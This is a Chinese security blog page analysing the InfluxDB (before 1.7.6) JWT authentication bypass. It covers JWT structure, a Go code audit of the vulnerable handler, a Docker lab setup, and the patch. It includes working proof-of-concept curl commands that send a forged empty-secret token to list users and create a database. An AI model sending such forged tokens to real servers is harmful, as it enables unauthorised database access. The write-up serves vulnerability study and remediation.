+<li>JavaScript安全<ul>
+<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
+</ul>
+</li>
+<li>NodeJS</li>
+<li>AngularJS</li>
+</ul>
+</li>
+<li><strong>GO</strong><ul>
+<li>GO安全<ul>
+<li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>二进制安全</strong><ul>
+<li>二进制基础<ul>
+<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
+<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
+<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
+<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
+<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
+<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
+<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
+</ul>
+</li>
+<li>C/C++<ul>
+<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
+</ul>
+</li>
+<li>逆向工程</li>
+<li>Fuzzing</li>
+<li>Pwn<ul>
+<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
+<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
+<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
+<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
+<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
+<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
+<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
+<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
+</ul>
+</li>
+<li>WriteUp Pwn<ul>
+<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
+</ul>
+</li>
+<li>WriteUp Reverse<ul>
+<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>渗透测试</strong><ul>
+<li>基础&amp;Tricks</li>
+<li>Kali</li>
+<li>Metasploit</li>
+<li>内网渗透</li>
+<li>提权<ul>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
+</ul>
+</li>
+<li>免杀</li>
+<li>工具</li>
+</ul>
+</li>
+<li><strong>OS</strong><ul>
+<li>Windows<ul>
+<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
+<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
+</ul>
+</li>
+<li>Linux</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+</div>
+
+<header class="post-header text-center">
+	<h1 class="title">
+		浅析Influxdb认证绕过漏洞
+	</h1>
+	<span class="read">
+		阅读量 <span id="busuanzi_value_page_pv"></span>
+	</span>
+</header><br>
+
+<div class="book-post">
+  <h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="Influxdb简介"><a href="#Influxdb简介" class="headerlink" title="Influxdb简介"></a>Influxdb简介</h3><p>TSDB（Time Series DataBase，时序数据库）是针对时间戳或时间序列数据进行优化的数据库，专门为处理带有时间戳的度量和事件度量而构建的。而时间序列数据可以是随时间跟踪、监视、下采样和聚合的度量或事件，如服务器指标、应用程序性能、网络数据、传感器数据以及许多其他类型的分析数据。</p>
+<p>Influxdb是一个开源的时序数据库，由GO语言编写，用于处理高写入和高查询负载。Influxdb被广泛应用于存储系统的监控数据，IoT行业的实时数据等场景。</p>
+<h3 id="关键特性"><a href="#关键特性" class="headerlink" title="关键特性"></a>关键特性</h3><p>Influxdb具有以下关键特性：</p>
+<ul>
+<li>能够高速读取和压缩时间序列数据</li>
+<li>使用 <code>Go</code> 编写，能够但文件运行，没有依赖</li>
+<li>提供了简单、高效的 <code>HTTP</code> 读写接口</li>
+<li>能够使用插件支持其他的数据协议，如： <code>Graphite=， =collectd</code> 和 <code>OpenTSDB</code></li>
+<li>可轻松使用 <code>SQL</code> 语言查询聚合数据</li>
+<li>能够使用 <code>Tag</code> 进行快速高效的查询</li>
+<li>支持保留策略(<code>Retention Policy</code>), 能够自动清理旧数据</li>
+<li>支持持续查询，能够自动定期计算聚合数据，提高了查询的效率</li>
+</ul>
+<h3 id="与传统数据库的概念比较"><a href="#与传统数据库的概念比较" class="headerlink" title="与传统数据库的概念比较"></a>与传统数据库的概念比较</h3><table>
+<thead>
+<tr>
+<th>Influxdb</th>
+<th>传统数据库</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>database</td>
+<td>数据库</td>
+</tr>
+<tr>
+<td>measurement</td>
+<td>表，但不支持联合查询</td>
+</tr>
+<tr>
+<td>point</td>
+<td>表中的一行数据</td>
+</tr>
+</tbody>
+</table>
+<p>其中point由时间戳（time）、数据（field）、标签（tags）组成，相当于传统数据库里的一行数据：</p>
+<table>
+<thead>
+<tr>
+<th>point属性</th>
+<th>传统数据库中的概念</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>time</td>
+<td>主键</td>
+</tr>
+<tr>
+<td>tags</td>
+<td>有索引的列</td>
+</tr>
+<tr>
+<td>fields</td>
+<td>没索引的列</td>
+</tr>
+</tbody>
+</table>
+<h3 id="目录与文件结构"><a href="#目录与文件结构" class="headerlink" title="目录与文件结构"></a>目录与文件结构</h3><p>Influxdb的数据存储即在其根目录下的database目录中主要有三个目录。默认情况下是meta、wal和data。</p>
+<ul>
+<li>meta目录：用于存储数据库的一些元数据，meta目录下有一个meta.db文件；</li>
+<li>wal目录：存放预写日志文件，以.wal结尾；</li>
+<li>data目录：存放实际存储的数据文件，以.tsm结尾。</li>
+</ul>
+<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>InfluxDB的配置文件为：/etc/influxdb/influxdb.conf</p>
+<p>选项详情请参见：<a href="https://docs.influxdata.com/influxdb/v1.7/administration/config/" target="_blank" rel="noopener">Configuration Settings</a></p>
+<h3 id="常用的InfluxQL语句"><a href="#常用的InfluxQL语句" class="headerlink" title="常用的InfluxQL语句"></a>常用的InfluxQL语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看所有的数据库</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line"><span class="comment">-- 使用特定的数据库</span></span><br><span class="line"><span class="keyword">use</span> database_name;</span><br><span class="line"><span class="comment">-- 查看所有的measurement</span></span><br><span class="line"><span class="keyword">show</span> measurements;</span><br><span class="line"><span class="comment">-- 查询10条数据</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> measurement_name <span class="keyword">limit</span> <span class="number">10</span>;</span><br><span class="line"><span class="comment">-- 数据中的时间字段默认显示的是一个纳秒时间戳，改成可读格式</span></span><br><span class="line">precision rfc3339; <span class="comment">-- 之后再查询，时间就是rfc3339标准格式</span></span><br><span class="line"><span class="comment">-- 或可以在连接数据库的时候，直接带该参数</span></span><br><span class="line">influx -precision rfc3339</span><br><span class="line"><span class="comment">-- 查看一个measurement中所有的tag key </span></span><br><span class="line"><span class="keyword">show</span> tag <span class="keyword">keys</span></span><br><span class="line"><span class="comment">-- 查看一个measurement中所有的field key </span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">field</span> <span class="keyword">keys</span></span><br><span class="line"><span class="comment">-- 查看一个measurement中所有的保存策略(可以有多个，一个标识为default)</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">retention</span> policies;</span><br></pre></td></tr></table></figure>
+<h3 id="Influxdb函数详解"><a href="#Influxdb函数详解" class="headerlink" title="Influxdb函数详解"></a>Influxdb函数详解</h3><p>参考：<a href="https://tanjiti.github.io/2019/02/20/influxdb函数详解/" target="_blank" rel="noopener">influxdb函数详解</a></p>
+<h3 id="HTTP接口"><a href="#HTTP接口" class="headerlink" title="HTTP接口"></a>HTTP接口</h3><p>Influxdb相关接口具体可参考官方文档：</p>
+<p>下面之看下几个简单的例子。</p>
+<h4 id="query"><a href="#query" class="headerlink" title="/query"></a>/query</h4><p>数据主要使用/query接口查询，下面给出一些常见用法，而更多用法参见：<a href="https://docs.influxdata.com/influxdb/v1.7/guides/querying_data/" target="_blank" rel="noopener">Querying data with the HTTP API</a> 。</p>
+<ul>
+<li><p>创建数据库</p>
+<p>POST请求可用于创建数据库，如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://localhost:8086/query --data-urlencode <span class="string">"q=CREATE DATABASE &lt;databasename&gt;"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查询</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET http://localhost:8086/query?pretty=<span class="literal">true</span> --data-urlencode <span class="string">'db=&lt;database name&gt;'</span> --data-urlencode <span class="string">'q=SELECT "field1","tag1"... FROM &lt;measurement&gt; WHERE &lt;condition&gt;'</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="write"><a href="#write" class="headerlink" title="/write"></a>/write</h4><p>发送POST请求是写入数据的主要方式，下面给出一些常见用法，而更多用法参见：<a href="https://docs.influxdata.com/influxdb/v1.7/guides/writing_data/" target="_blank" rel="noopener">Writing data with the HTTP API</a> 。</p>
+<ul>
+<li><p>插入一条Point：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://localhost:8086/write?db=&lt;database name&gt; --data-binary <span class="string">"cpu_load,machine=001,region=cn value=0.56 1555164637838240795"</span></span><br></pre></td></tr></table></figure>
+<p>必须指定<code>database name</code></p>
+</li>
+</ul>
+<h3 id="身份认证机制——JWT"><a href="#身份认证机制——JWT" class="headerlink" title="身份认证机制——JWT"></a>身份认证机制——JWT</h3><p>Influxdb支持基于密码的身份认证和基于JWT的身份认证。</p>
+<p>下面详细介绍JWT机制。</p>
+<h4 id="JWT基本原理"><a href="#JWT基本原理" class="headerlink" title="JWT基本原理"></a>JWT基本原理</h4><p>JWT即JSON Web Tokens，是目前最流行的跨域身份验证解决方案。</p>
+<p>JWT的原理就是在服务器身份验证之后，将生成一个JSON对象并将其发送回用户，如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"Username"</span>: <span class="string">"mi1k7ea"</span>,</span><br><span class="line">  <span class="string">"Role"</span>: <span class="string">"Admin"</span>,</span><br><span class="line">  <span class="string">"Expire"</span>: <span class="string">"2020-01-01 00:00:00"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此后，用户与服务端通信时，都要发回这个JSON对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。</p>
+<p>服务器不保存任何session数据，也就是说，服务器变成无状态，从而比较容易实现扩展。</p>
+<h4 id="JWT原理图"><a href="#JWT原理图" class="headerlink" title="JWT原理图"></a>JWT原理图</h4><p>如下：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/1.png" alt=""></p>
+<h4 id="JWT结构"><a href="#JWT结构" class="headerlink" title="JWT结构"></a>JWT结构</h4><p>一个示例的JWT如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure>
+<p>这是一个很长的字符串，中间用点<code>.</code>分隔成三个部分。</p>
+<p>一个JWT实际上就是一个字符串，由三部分组成：</p>
+<ul>
+<li>Header（头部）</li>
+<li>Payload（载荷）</li>
+<li>Signature（签名）</li>
+</ul>
+<h5 id="Header（头部）"><a href="#Header（头部）" class="headerlink" title="Header（头部）"></a>Header（头部）</h5><p>Header部分是一个JSON对象，描述JWT的元数据，通常是下面的样子。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">  <span class="attr">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面代码中，alg属性表示签名的算法（algorithm），默认是HMAC SHA256（写成HS256）；typ属性表示这个令牌（token）的类型（type），JWT令牌统一写为JWT。</p>
+<p>最后，将上面的JSON对象使用Base64URL算法转成字符串。</p>
+<h5 id="Payload（载荷）"><a href="#Payload（载荷）" class="headerlink" title="Payload（载荷）"></a>Payload（载荷）</h5><p>Payload部分也是一个JSON对象，用来存放实际需要传递的数据。JWT规定了7个官方字段供选用：</p>
+<ul>
+<li>iss (issuer)：签发人</li>
+<li>exp (expiration time)：过期时间</li>
+<li>sub (subject)：主题</li>
+<li>aud (audience)：受众</li>
+<li>nbf (Not Before)：生效时间</li>
+<li>iat (Issued At)：签发时间</li>
+<li>jti (JWT ID)：编号</li>
+</ul>
+<p>除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"sub"</span>: <span class="string">"1234567890"</span>,</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"John Doe"</span>,</span><br><span class="line">  <span class="attr">"admin"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>注意，JWT默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。</strong></p>
+<p>这个JSON对象也要使用Base64URL算法转成字符串。</p>
+<h5 id="Signature（签名）"><a href="#Signature（签名）" class="headerlink" title="Signature（签名）"></a>Signature（签名）</h5><p>Signature部分是对前两部分的签名，防止数据篡改。</p>
+<p>首先，<strong>需要指定一个密钥（secret）</strong>。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是HMAC SHA256），按照下面的公式产生签名：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + "." +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>
+<p>算出签名以后，把Header、Payload、Signature三个部分拼成一个字符串，每个部分之间用<code>.</code>分隔，就可以返回给用户。</p>
+<h5 id="Base64URL算法"><a href="#Base64URL算法" class="headerlink" title="Base64URL算法"></a>Base64URL算法</h5><p>前面提到，Header和Payload串型化的算法是Base64URL。这个算法跟Base64算法基本类似，但有一些小的不同。</p>
+<p>JWT作为一个令牌（token），有些场合可能会放到URL（比如api.example.com/?token=xxx）。Base64有三个字符<code>+</code>、<code>/</code>和<code>=</code>，在URL里面有特殊含义，所以要被替换掉：<code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code> 。这就是Base64URL算法。</p>
+<h4 id="JWT的用法"><a href="#JWT的用法" class="headerlink" title="JWT的用法"></a>JWT的用法</h4><p>客户端收到服务器返回的JWT，可以储存在Cookie或LocalStorage中。</p>
+<p>此后，客户端每次与服务器通信，都要带上这个JWT。你可以把它放在Cookie里面自动发送，但是这样不能跨域，所以更好的做法是放在HTTP请求的头信息<code>Authorization</code>字段里面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure>
+<p>另一种做法是，跨域的时候JWT就放在POST请求的数据体里面。</p>
+<h4 id="如何生成JWT"><a href="#如何生成JWT" class="headerlink" title="如何生成JWT"></a>如何生成JWT</h4><p>在线网站可生成JWT凭据：<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p>
+<h2 id="0x02-Influxdb认证绕过漏洞"><a href="#0x02-Influxdb认证绕过漏洞" class="headerlink" title="0x02 Influxdb认证绕过漏洞"></a>0x02 Influxdb认证绕过漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Influxdb &lt; 1.7.6 的版本。</p>
+<h3 id="漏洞原理及代码审计"><a href="#漏洞原理及代码审计" class="headerlink" title="漏洞原理及代码审计"></a>漏洞原理及代码审计</h3><p>Influxdb认证绕过漏洞，说白了就是默认的不安全配置导致的逻辑漏洞（未校验JWT的Signature部分的secret即密钥是否为空），可导致正常的身份认证被绕过。在Influxdb中，JWT的默认设置不会在“共享秘密”键中创建任何值。换句话说，默认情况下，创建有效的JWT令牌所需的“secret”为空。</p>
+<p>下面我们下载1.7.5版本的Influxdb源码进行GO语言的代码审计，可控漏洞点出在哪里。</p>
+<p>我们知道PoC是如下的形式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://xxx:8086/query'</span> --data-urlencode <span class="string">'q=show users'</span> -H <span class="string">'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k'</span></span><br></pre></td></tr></table></figure>
+<p>那么直接搜索关键词来寻找对应的认证代码，如搜索“Authorization”，找到influxdb-1.7.5\services\httpd\handler.go这个文件。在其中看到authenticate()即认证函数，这里会调用parseCredentials()函数来解析凭证，然后根据返回的凭证方法到下面的switch语句中匹配：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/2.png" alt=""></p>
+<p>跟进parseCredentials()函数，当中获取Authorization头字段，若不为空，则通过空格切割其值，然后switch语句匹配第一个值的内容，当匹配到“Bearer”时则返回包含Method为“BearerAuthentication”的creds变量：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/3.png" alt=""></p>
+<p>返回到authenticate()函数中，继续往下，就能匹配到switch语句的BearerAuthentication代码块：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/4.png" alt=""></p>
+<p>这段代码解析到token具体的值后，获取其中声明的exp和username的值，这里exp需要满足float64类型的数值、username需要是个字符串类型，接着根据username即用户名去查找是否存在该用户，若都不报错则调用inner()函数成功往下执行，即认证成功。</p>
+<p>在这里我们可以明显看到，我们的JWT的Signature部分的secret即密钥是可以设置为空的，因为这里没有对其是否为空进行校验，并且默认也是为空的，即：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + "." +</span><br><span class="line">  base64UrlEncode(payload),)</span><br></pre></td></tr></table></figure>
+<p>由于没有使用密钥对前面两个部分的内容进行加密，因此任意用户只要知道用户名就可以构造JWT凭证来绕过认证。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>这里我们使用Docker来搭建漏洞环境。</p>
+<p>依次执行如下命令即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索Influxdb Docker容器</span></span><br><span class="line">docker search influxdb</span><br><span class="line"><span class="comment"># 拉取漏洞版本的镜像</span></span><br><span class="line">docker pull influxdb:1.7.5</span><br><span class="line"><span class="comment"># 运行docker容器</span></span><br><span class="line">docker run -it -d --name influxdb -p 8086:8086 influxdb:1.7.5</span><br><span class="line"><span class="comment"># 进入运行的docker容器中</span></span><br><span class="line">docker <span class="built_in">exec</span> -it influxdb /bin/bash</span><br></pre></td></tr></table></figure>
+<p>接着新建数据库用户，在influx终端运行如下命令创建新用户mi1k7ea：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; use _internal</span><br><span class="line">Using database _internal</span><br><span class="line">&gt; create user "mi1k7ea" with password '123456' with all privileges</span><br><span class="line">&gt; show users</span><br><span class="line">user    admin</span><br><span class="line"><span class="comment">----    -----</span></span><br><span class="line">mi1k7ea true</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<p>然后在Influxdb的配置文件/etc/influxdb/influxdb.conf中添加配置开启认证：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/10.png" alt=""></p>
+<p>然后重启即可。</p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>先确定版本号是否存在漏洞，这里看到版本为1.7.5 &lt; 1.7.6，是存在认证绕过漏洞的版本：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/6.png" alt=""></p>
+<p>接着，判断Influxdb服务绑定的端口号以及是否在公网进行监听：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/7.png" alt=""></p>
+<p>默认情况下，Influxdb服务是绑定在8086端口上供其他进程访问的。如果是监听在公网上，则存在未授权访问漏洞，漏洞危害达到最大化。</p>
+<p>下面的利用先在本地测试。</p>
+<p>输入如下命令进行用户名发现：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://127.0.0.1:8086/debug/requests'</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/8.png" alt=""></p>
+<p>可以看到并没有返回数据库相关的用户名。</p>
+<p>尝试直接访问/query接口，发现没有认证凭据不能访问：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G -X POST <span class="string">'http://127.0.0.1:8086/query'</span> --data-urlencode <span class="string">'q=show users'</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/13.png" alt=""></p>
+<h4 id="构造PoC"><a href="#构造PoC" class="headerlink" title="构造PoC"></a>构造PoC</h4><p>下面我们就来构造实现认证绕过的JWT。</p>
+<p>由前面的分析知道，我们需要填写的仅仅是第二部分的Payload中的username和exp而已。这里username是Influxdb中存在的用户名即可，而exp (expiration time)即认证有效时间，需要我们设置得比当前时间大。</p>
+<p>我们可以通过在线工具方便地获取：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/14.png" alt=""></p>
+<p>除了线上的方法，这里列下几种编程语言生成时间戳的代码实现。</p>
+<p>Java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">int</span>) (System.currentTimeMillis() / <span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
+<p>Python：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.time()</span><br></pre></td></tr></table></figure>
+<p>PHP：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time()</span><br></pre></td></tr></table></figure>
+<p>这样，就可以直接到<code>https://jwt.io/</code>中构造JWT了，这里攻击者只需知道Influxdb数据库存在mi1k7ea用户即可（注意：第三部分Signature中的secret即密钥设置为空，因为默认都是无共享密钥的，即使目标服务端设置了我们也无从知道也无法利用）：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/12.png" alt=""></p>
+<p>最终PoC如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://127.0.0.1:8086/query'</span> --data-urlencode <span class="string">'q=show users'</span> -H <span class="string">'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k'</span></span><br></pre></td></tr></table></figure>
+<p>本地利用效果如图，成功查询得到用户信息：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/11.png" alt=""></p>
+<p>修改下PoC的利用方式，添加新的数据库：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://127.0.0.1:8086/query'</span> --data-urlencode <span class="string">'q=create database hacked'</span> -H <span class="string">'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k'</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/15.png" alt=""></p>
+<p>远程利用也是一样的，直接往目标服务端的Influxdb接口发送PoC即可成功利用：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/9.png" alt=""></p>
+<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>这里下载1.7.6版本的Influxdb，打开influxdb-1.7.6\services\httpd\handler.go这个文件对比发现，在解析JWT之前多了一段代码：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/5.png" alt=""></p>
+<p>可以看到该代码判断当前JWT的secret即密钥是否为空，若为空则直接报错，从而修补了漏洞。</p>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>升级Influxdb至最新版即可。</p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.komodosec.com/post/when-all-else-fails-find-a-0-day" target="_blank" rel="noopener">When all else fails – find a 0-day</a></p>
+<p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">JSON Web Token 入门教程</a></p>
+
+</div>
+
+<br>
+<div><center>
+  <span>Copyright &copy; Mi1k7ea</span>  |  <span id="busuanzi_container_site_uv">本站总访问量 <span id="busuanzi_value_site_uv"></span> 次</span>
+</center></div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+<script src="/js/book-post.js"></script>
+        </div>
+      </div>
+
+      <div class="column col-2 hide-lg">
+        <div class="book-toc">
+  <div class="book-tocbot">
+  </div>
+  <div class="book-tocbot-menu">
+    <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+    <a onclick="go_top()">Back to top</a>
+    <a onclick="go_bottom()">Go to bottom</a>
+  </div>
+</div>
+
+<script>
+tocbot.init({
+  tocSelector: '.book-tocbot',
+  contentSelector: '.book-post',
+  headingSelector: 'h1, h2, h3, h4, h5',
+  collapseDepth: 2,
+  orderedList: false,
+  scrollSmooth: false,
+});
+
+function expand_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 6,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "collapse_toc()");
